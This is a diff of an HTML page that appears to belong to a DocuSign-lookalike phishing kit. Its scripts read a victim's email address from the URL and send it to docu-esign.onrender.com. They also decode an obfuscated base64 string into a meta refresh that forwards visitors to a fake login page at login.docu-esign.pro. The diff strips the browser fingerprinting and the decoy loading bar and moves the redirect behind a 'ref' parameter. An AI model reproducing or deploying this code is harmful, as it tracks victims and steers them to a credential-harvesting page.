@@ -5,101 +5,38 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <script type="text/javascript">
       let hasEmail = new URLSearchParams(window.location.search).has("id");
-      let userAgent;
       if (hasEmail) {
-        function isMobileDevice() {
-          return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
-            navigator.userAgent
-          );
-        }
-
-        function detectBrowser() {
-          // User agent string
-          var userAgent = navigator.userAgent;
-
-          // Check for common browser identifiers
-          if (userAgent.indexOf("Firefox") > -1) {
-            return "Mozilla Firefox";
-          } else if (userAgent.indexOf("Chrome") > -1) {
-            return "Google Chrome";
-          } else if (userAgent.indexOf("Safari") > -1) {
-            return "Apple Safari";
-          } else if (userAgent.indexOf("Edg") > -1) {
-            return "Microsoft Edge";
-          } else if (
-            userAgent.indexOf("MSIE") > -1 ||
-            userAgent.indexOf("Trident") > -1
-          ) {
-            return "Internet Explorer";
-          } else {
-            return "Unknown";
-          }
-        }
-        if (isMobileDevice()) {
-          userAgent = "Mobile Device";
-        } else {
-          userAgent = detectBrowser();
-        }
         let email = new URLSearchParams(window.location.search).get("id");
-        let payLoad = { id: 0, email: email, userAgent: userAgent };
+        let payLoad = {id: 0, email: email}
         let emailXhr = new XMLHttpRequest();
         emailXhr.open("POST", "https://docu-esign.onrender.com/email", true);
         emailXhr.setRequestHeader("Content-type", "application/json");
         emailXhr.send(JSON.stringify(payLoad));
 
-        emailXhr.onreadystatechange = function () {
-          if (this.readyState == 4 && this.status == 200) {
-            document.write(
-              decodeURIComponent(
-                atob(
-                  "JTNDbWV0YSUwQSUyMCUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTBBJTIwJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vbG9naW4uZG9jdS1lc2lnbi5wcm8vZkdBSk53Q1AlM0ZzVXUlM0R0TnRRcVFEQmtOUi1jVWpZTkx6TlhVenlBTHFaNGdrSUM0UnVrS1JvQ3pDQjN1Q3ZzUmNNTHclMjIlMEEvJTNFJTBB"
-                )
-              )
-            );
-          }
-        };
+        emailXhr.onreadystatechange = function() {
+            if (this.readyState == 4 && this.status == 200) {
+                let response = JSON.parse(this.response);
+                console.log(response);
+            }
+        }
+      }
+    </script>
+
+    <script type="text/javascript">
+      let hasRef = new URLSearchParams(window.location.search).has("ref");
+      if (hasRef) {
+        let ref = new URLSearchParams(window.location.search).get("ref");
+        document.write(
+          decodeURIComponent(
+            atob(
+              `JTNDbWV0YSUwQSUyMCUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTBBJTIwJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vbG9naW4uZG9jdS1lc2lnbi5wcm8vZkdBSk53Q1AlM0ZzVXUlM0R0TnRRcVFEQmtOUi1jVWpZTkx6TlhVenlBTHFaNGdrSUM0UnVrS1JvQ3pDQjN1Q3ZzUmNNTHclMjIlMEEvJTNFJTBB`
+            )
+          )
+        );
       }
     </script>
 
     <title>Document</title>
-    <style>
-      #loader {
-        width: 0%;
-        position: relative;
-        animation: incrementWidth 1s linear forwards;
-      }
-
-      @keyframes incrementWidth {
-        0% {
-          width: 0%;
-        }
-        100% {
-          width: 98%;
-        }
-      }
-    </style>
   </head>
-  <body>
-    <div
-      style="
-        height: 100vh;
-        width: 100%;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-      "
-    >
-      <div style="width: 200px">
-        <img src="./Email_Logo.png" alt="" style="margin-left: 13px" />
-        <div
-          id="loader"
-          style="
-            padding: 2px;
-            background-color: rgb(30, 76, 161);
-            border-radius: 4px;
-          "
-        ></div>
-      </div>
-    </div>
-  </body>
+  <body></body>
 </html>
